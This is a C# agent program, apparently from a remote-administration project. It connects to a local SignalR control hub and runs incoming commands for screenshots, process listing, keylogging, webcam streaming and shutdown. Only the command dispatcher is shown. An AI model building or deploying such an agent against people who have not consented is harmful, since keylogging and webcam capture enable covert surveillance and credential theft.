// Agent/Program.cs
using Microsoft.AspNetCore.SignalR.Client;

class Program
{
    static async Task Main(string[] args)
    {
        var agentId = Environment.MachineName; // hoặc nhập tay
        var connection = new HubConnectionBuilder()
            .WithUrl("http://localhost:5000/controlhub?agentId=" + agentId)
            .Build();

        connection.On<object>("ReceiveCommand", async (command) =>
        {
            var json = command.ToString();
            await HandleCommand(connection, json);
        });

        await connection.StartAsync();
        Console.WriteLine($"Agent {agentId} connected. Waiting for commands...");

        Console.ReadLine();
    }

    static async Task HandleCommand(HubConnection connection, string json)
    {
        // Parse JSON (dùng System.Text.Json)
        var doc = JsonDocument.Parse(json);
        var root = doc.RootElement;
        var action = root.GetProperty("action").GetString();

        switch (action)
        {
            case "app_list": await AppManager.ListApps(connection); break;
            case "process_list": await ProcessManager.ListProcesses(connection); break;
            case "screenshot": await Screenshot.Capture(connection); break;
            case "keylogger_start": Keylogger.Start(connection); break;
            case "keylogger_stop": Keylogger.Stop(); break;
            case "shutdown": await Shutdown.Execute("shutdown"); break;
            case "restart": await Shutdown.Execute("restart"); break;
            case "webcam_on": Webcam.StartStreaming(connection); break;
            case "webcam_off": Webcam.StopStreaming(); break;
            // Start/Stop app/process
            default: await connection.SendAsync("SendToClient", "unknown", json); break;
        }
    }
}